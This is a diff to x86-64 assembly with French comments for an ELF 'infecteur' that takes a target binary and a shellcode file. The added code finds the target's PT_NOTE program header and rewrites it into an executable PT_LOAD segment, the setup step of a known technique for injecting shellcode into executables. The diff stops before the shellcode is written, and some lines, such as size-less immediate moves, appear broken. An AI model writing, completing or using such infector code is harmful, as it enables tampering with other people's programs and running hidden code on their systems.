@@ -11,6 +11,7 @@ default rel
 %define P_FLAGS     0x04
 %define P_OFFSET    0x08
 %define P_VADDR     0x10
+%define P_PADDR     0x18
 %define P_FILESZ    0x20
 %define P_MEMSZ     0x28
 %define P_ALIGN     0x30
@@ -23,10 +24,10 @@ default rel
 %define PF_X    1
 
 section .data
-    msg db "parcer: alive", 10
-    msg_len equ $ - msg
     msg_usage db "Usage: ./infecteur <elf> <shellcode.bin>", 10
     msg_usage_len equ $ - msg_usage
+    msg_found db "PT_NOTE trouve", 10   ; message de debug
+    msg_found_len equ $ - msg_found     ; longueur
 
 section .bss
     fd: resq 1 ; on réserve 8 octets pour stocker le file descriptor
@@ -47,7 +48,7 @@ _start:
     mov rax, 2  ; syscall ouvert
     syscall
     test rax, rax
-    jl .usage
+    js .usage
     mov [fd], rax
 
     ;lseek
@@ -68,10 +69,44 @@ _start:
     mov rax, 9              ; mmap
     syscall
     mov [buf], rax
+    mov rax, [buf]  ; base du fichier mappe
+    mov rbx, [rax + E_PHOFF]    ; e_phoff = offset table phdrs
+    add rbx, rax    ; rbx = adresse du 1er phdr
+    movzx rcx, word [rax + E_PHNUM] ; nombre de segments
 
-    ;exit
-    mov rax, 60
-    xor rdi, rdi
+    .find_note:
+    cmp dword [rbx + P_TYPE], PT_NOTE       ; on compare la veleur p_type du phdr avec PT_NOTE
+    je .found   ; si oui, saute a .found
+    add rbx, P_PHDR_SIZE    ; phdr suivant (56 octets)
+    dec rcx ; decremente le compteur
+    jnz .find_note  ; si reste > 0, on reboucle
+    mov rax, 60 ; syscall exit
+    mov rdi, 1  ; code de retour 1 (erreur)
+    syscall
+
+    .found: ; label : PT_NOTE trouve
+
+    mov rax, [fsize]    ; taille du fichier cible
+    add rax, 0xFFF  ; arrondir au 0x1000 superieur
+    and rax, ~0xFFF     ; enleve les 12 bits du bas
+
+    mov dword [rbx + P_TYPE], PT_LOAD   ; type = PT_LOAD
+    mov dword [rbx + P_FLAGS], PF_R | PF_X ; flags = lisible + executable
+    mov [rbx + P_OFFSET], rax ; offset = vaddr
+    mov [rbx + P_VADDR], rax ; vaddr
+    mov [rbx + P_PADDR], rax ; paddr
+    mov [rbx + P_FILESZ], 0  ; filesz = 0 pour l'instant
+    mov [rbx + P_MEMSZ], 0  ; memsz = 0 pour l'instant
+    mov qword [rbx + P_ALIGN], 0x1000 ; alignement page
+
+    mov rax, 1  ; syscall write
+    mov rdi, 1  ; stdout
+    lea rsi, [msg_found]    ; message
+    mov rdx, msg_found_len  ; longueur
+    syscall
+
+    mov rax, 60 ; syscall exit
+    xor rdi, rdi        ; code de retour 0 (succes)
     syscall
 
 .usage:
